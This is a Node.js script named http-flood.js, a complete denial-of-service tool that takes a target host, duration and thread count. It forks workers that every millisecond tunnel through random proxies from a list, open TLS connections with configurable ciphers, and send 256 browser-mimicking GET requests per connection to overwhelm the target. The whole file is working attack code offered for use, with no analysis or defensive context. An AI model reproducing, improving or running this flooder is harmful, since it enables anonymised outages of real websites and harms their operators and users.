const url = require('url');
const {constants} = require('crypto');
const cluster = require("cluster");
const http = require('http');
const tls = require('tls');
const fs = require('fs');

require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (er) {
    console.error(er)
});
process.on('unhandledRejection', function (er) {
    console.error(er)
});

if (process.argv.length < 3) {
    console.log("node http-flood.js <host> <time> <threads>");
    process.exit(-1);
}
const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
const cplist = fs.readFileSync("payload.txt", 'utf-8').toString().split('\n');
const target_url = process.argv[2];
const delay = process.argv[3];
const threads = process.argv[4];
const proxys = fs.readFileSync("checked.txt", 'utf-8').toString().split('\n');
const SignalsList = sigalgs.join(':');
const chipers = cplist.join(':')
 const parsed = url.parse(target_url);
 const keepAliveAgent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: Infinity
});
console.log(chipers)
if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start flood!');
    startflood();
}


function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}


function startflood() {
    console.log('Start attack!');
     setInterval(() => {
        var proxy = getRandomElement(proxys).replace(/\r/g, "").split(':');
        var req = http.request({
            host: proxy[0],
            port: proxy[1],
            method: 'CONNECT',
            path: parsed.host + ":443",
            agent : keepAliveAgent
        });
  
        req.on('connect', function (res, socket, head) { 
            socket.setTimeout(5000, () => {
                socket.destroy();
            });

            var tlsConnection = tls.connect({
                host: parsed.host,
                servername: parsed.host,
                ciphers: chipers,
                secureProtocol: ['TLSv1_1_method','TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                secure: true,
                requestCert: true,
                gzip: true,
                followAllRedirects: true,
                decodeEmails: false,
                sigalgs: SignalsList,
                honorCipherOrder: true,
                secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_RENEGOTIATION | constants.SSL_OP_NO_TICKET | constants.SSL_OP_NO_SSLv2 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_COMPRESSION | constants.SSL_OP_NO_RENEGOTIATION | constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | constants.SSL_OP_TLSEXT_PADDING | constants.SSL_OP_ALL ,
                rejectUnauthorized: false,
                socket: socket,
                
            }, function () {
                tlsConnection.setKeepAlive(true,50000)
                for (let index = 0; index < 256; index++) {
                    tlsConnection.write("GET "+parsed.pathname+"  HTTP/1.1\r\nHost: "+parsed.host+"\r\nUser-Agent: "+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"+"\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n")
                }
            });
            tlsConnection.setEncoding('utf8');
            tlsConnection.on('response', function (data) {
                tlsConnection.end();
            });
            tlsConnection.on('data', function (data) {
                //console.log(data);
            });
            tlsConnection.on('error', function (data) {
                tlsConnection.end();
            });
        });
        req.end();
    },1);
}